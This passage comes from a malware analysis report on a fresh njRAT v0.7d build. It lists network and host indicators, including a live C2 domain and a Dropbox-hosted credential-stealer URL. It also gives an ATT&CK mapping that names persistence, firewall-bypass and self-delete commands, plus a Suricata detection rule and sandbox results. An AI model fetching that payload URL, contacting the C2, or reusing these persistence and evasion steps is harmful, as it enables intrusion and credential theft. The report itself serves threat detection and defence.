|---|---|---|---|
| Domain | `phishing.multimilliontoken.org` | C2 server | Static + Dynamic |
| IP | `188.114.97.3` | C2 (Cloudflare proxy) | ANY.RUN |
| IP | `188.114.96.3` | C2 (Cloudflare proxy) | ANY.RUN |
| IP | `104.21.50.193` | C2 (Cloudflare proxy) | Joe Sandbox |
| Port | `443/tcp` | C2 port (raw TCP, not TLS) | Static + Dynamic |
| URL | `https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe?dl=0` | Credential theft payload | Static |
| Protocol | `|'|'|`-delimited plaintext TCP | njRAT signature | Static |
| Suricata | `BACKDOOR njRAT Bladabindi CnC Communication command ll` | IDS alert | Dynamic |
| ASN | AS13335 (CLOUDFLARENET) | C2 hosting infrastructure | Dynamic |

### Host Indicators

| Type | Value | Context | Source |
|---|---|---|---|
| Mutex | `411e31664bdd9d96369d0a44d5111aef` | Instance lock | Static + Dynamic |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\411e...` | Persistence (key name = mutex) | Dynamic |
| Registry | `HKCU\di` = `!` | njRAT install marker | Dynamic |
| File | `%TEMP%\server.exe` | Drop location | Static |
| File | `autorun.inf` on removable drives | USB worm | Static |
| Process | `svchost.exe` (fake) | Process name masquerade | Static |
| Process | `netsh.exe` (child) | Firewall rule creation | Dynamic |
| Firewall | `netsh firewall add allowedprogram` | Exception rule | Static + Dynamic |
| Fingerprint | `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid` | Hardware ID read | Dynamic |

### File Hashes

| Hash | Value |
|---|---|
| SHA-256 | `ff87cd932e25b024cd10042c186f252fdabdac2c4d4cbc67f89e457697ebbc71` |
| MD5 | `129df3c4dcaae4c1860a334be50f2ed3` |
| SHA-1 | `4cda77bc5d5c136c4a5a19122fd378b045cc7dee` |

### MITRE ATT&CK Mapping

| ID | Technique | Evidence |
|---|---|---|
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | `HKCU\...\Run` persistence |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | `cmd.exe` remote shell |
| T1056.001 | Input Capture: Keylogging | `GetAsyncKeyState` polling |
| T1113 | Screen Capture | `CopyFromScreen` / `Bitmap` |
| T1125 | Video Capture | `capGetDriverDescriptionA` webcam |
| T1071 | Application Layer Protocol | Port 443 raw TCP (disguised as HTTPS) |
| T1091 | Replication Through Removable Media | `autorun.inf` USB spread |
| T1562.001 | Impair Defenses: Disable or Modify Tools | Kill taskmgr/processhacker; `ProcessBreakOnTermination` BSoD anti-removal |
| T1562.004 | Impair Defenses: Disable or Modify System Firewall | `netsh firewall` exception |
| T1112 | Modify Registry | Disable CMD/Registry Editor/Task Manager/System Restore |
| T1529 | System Shutdown/Reboot | `shutdown -s/-r/-l` commands |
| T1555 | Credentials from Password Stores | Dropbox-hosted Pass.exe |
| T1105 | Ingress Tool Transfer | Plugin download and execute |
| T1070.004 | Indicator Removal: File Deletion | `ping 0 & del` self-delete |
| T1620 | Reflective Code Loading | `Assembly.Load(byte[])` in Plugin() — fileless payload staging |
| T1036.005 | Masquerading: Match Legitimate Name | Drop as `svchost.exe` on USB drives |
| T1095 | Non-Application Layer Protocol | Raw TCP on port 443 (not TLS) |
| T1571 | Non-Standard Port | Custom protocol on standard HTTPS port |

---

## Detection

### YARA

Two rules in `detection/njrat_im523.yar`:

1. **njRAT_im523_HacKed_Campaign** — high-fidelity rule targeting this specific build (version + C2 + mutex + campaign tag)
2. **njRAT_Generic_v07d** — family-level detection for any njRAT v0.7d variant (separator + 5 command strings)

### Network (Suricata)

```
alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (
    msg:"MALWARE njRAT v0.7d C2 beacon (plaintext on 443)";
    flow:established,to_server;
    content:"|27|'|27|";
    detection_filter:type count, track by_src, count 3, seconds 300;
    sid:2026042; rev:1;
)
```

Note: njRAT sends plaintext on port 443 — any TLS inspection will immediately flag this as anomalous since there's no TLS handshake.

---

## Conclusion

This 37KB njRAT v0.7d im523 variant is a textbook Bladabindi build with zero obfuscation — the operator relied entirely on the small file size and port 443 abuse for evasion rather than code protection. The "HacKed" campaign tag and `phishing.multimilliontoken.org` C2 domain are novel with no prior public reporting, suggesting a recently provisioned infrastructure.

Despite its commodity nature, the sample packs an impressive density of capabilities into 37KB: keylogger, screen/webcam capture, remote shell, USB worm propagation, 20+ system control commands, anti-analysis tool detection, and a plugin system for deploying secondary payloads (including a Dropbox-hosted credential harvester). The plaintext C2 protocol on port 443 is trivially detectable — a single Suricata rule on the `|'|'|` separator will catch all njRAT v0.7d variants on the network.

What makes this sample worth writing up isn't the malware itself — njRAT is commodity, well-documented, thirteen years old. It's the operational picture. A fresh build compiled four days before I found it, beaconing to a domain with zero public reporting, proxied through Cloudflare, with the campaign tag "HacKed." Someone is actively using this framework in 2026 with enough operational discipline to provision new infrastructure but not enough to obfuscate their implant.

The plaintext C2 protocol on port 443 is trivially detectable — a single Suricata rule on the `|'|'|` separator will catch every njRAT v0.7d variant on the network. The real value of this analysis is the complete decompiled source mapping: every method name to its function, every config field to its purpose, every Win32 API call to its actual behavior. If you encounter an njRAT sample in your own triage, the deobfuscation is already done for you.

---

## Appendix A: Automated Triage Scores

The sample was flagged by our automated triage pipeline and confirmed by two independent sandbox services.

| Source | Score | Notes |
|---|---|---|
| Internal CAPA pipeline | 100/100 RED ALERT | Maximum risk score across 150+ capability rules |
| [ANY.RUN](https://any.run/report/ff87cd932e25b024cd10042c186f252fdabdac2c4d4cbc67f89e457697ebbc71/53b4744e-dac1-4bb7-b798-687edc2aca99) | Malicious | njRAT detected via YARA + Suricata |
| [Joe Sandbox](https://www.joesandbox.com/analysis/1894290/0/html) | 100/100 | njRAT detected, 94% ReversingLabs, 92% VirusTotal |

AV classification: `ByteCode-MSIL.Backdoor.NjRAT` (ReversingLabs), `TR/ATRAPS.Gen` (Avira). Despite being "novel" in our MCRIT similarity engine (zero family match), the binary is well-detected by signature-based AV — the novelty was in the infrastructure (C2 domain), not the code.

---

## Appendix B: Dynamic Sandbox Validation

Two sandbox runs confirmed that the static analysis findings are consistent with runtime behavior. I did not interact with the C2 myself — these results come from automated detonation.

### ANY.RUN (150-second run)

| Finding | Value |
|---|---|
| C2 resolved | `188.114.97.3`, `188.114.96.3` (CLOUDFLARENET) |
| First beacon | `ll` command — njRAT's "I'm alive" check |
| Suricata | `BACKDOOR njRAT Bladabindi CnC Communication command ll` (SID 2021176) |
| Registry | `HKCU\di` = `!` (install marker, matches `ko()` line 1352) |
| Child process | `netsh.exe` — firewall exception (matches `INS()` line 1238) |
| Machine GUID | Read `HKLM\...\Cryptography\MachineGuid` for hardware fingerprinting |

### Joe Sandbox (7-minute run, score 100/100)

| Finding | Value |
|---|---|
| C2 resolved | `104.21.50.193` (different Cloudflare IP — confirms DNS load balancing) |
| Suricata | 1,000+ alerts (hit max), same SID 2021176 |
| Sleep interception | 469,976 `Sleep` calls accelerated — the 1ms keylogger loop (`kl.WRK()`) is the cause |
| CPU | >49% — confirmed by the `Thread.Sleep(1)` tight polling loop |
| Reconnect cadence | New TCP socket every ~2.3s (matches `connect()`'s `Thread.Sleep(2000)`) |

### Sandbox False Positives (verified against source)

Joe Sandbox flagged several behaviors that are actually standard .NET CLR runtime artifacts, not malware code. I verified each against the decompiled source to avoid misattribution:

| Sandbox Signature | Reality |
|---|---|
| `MEM_WRITE_WATCH` allocation | .NET GC generational write barrier |
| `PAGE_GUARD` pages | CLR stack overflow detection |
| Module proxying (`Culture.dll`) | .NET ResourceManager satellite assembly loading |
| `SetErrorMode(NOOPENFILEERRORBOX)` | CLR default error mode |
| `"Hyper-V RAW"` in memory | Winsock provider string on all Win10+ hosts |
| `OriginalFilename = mscorwks.dll` | .NET 2.0 CLR runtime DLL in process memory (PE has no version info) |

This is a recurring problem when sandboxing .NET malware — the CLR's internal housekeeping triggers signatures designed for native code. Always cross-reference sandbox findings against the actual source before including them in a report.

---

## Appendix C: Attribution Context

Joe Sandbox's threat intel associates njRAT broadly with **AQUATIC PANDA**, **Earth Lusca**, **Operation C-Major**, and **The Gorgon Group** — groups with Middle East and South Asian operational nexus. The "HacKed" campaign tag and phishing-themed domain are consistent with script-level operators in this space, but attribution cannot be established from a single sample. njRAT's builder is widely leaked and used by actors across all sophistication levels.

---

*Tools used: ILSpy (decompilation), dnfile/pefile (PE + .NET metadata), custom Python extraction scripts. Dynamic validation via [ANY.RUN](https://any.run/report/ff87cd932e25b024cd10042c186f252fdabdac2c4d4cbc67f89e457697ebbc71/53b4744e-dac1-4bb7-b798-687edc2aca99) and [Joe Sandbox](https://www.joesandbox.com/analysis/1894290/0/html). Win32 API prototypes from [Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/).*

*Licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/).*
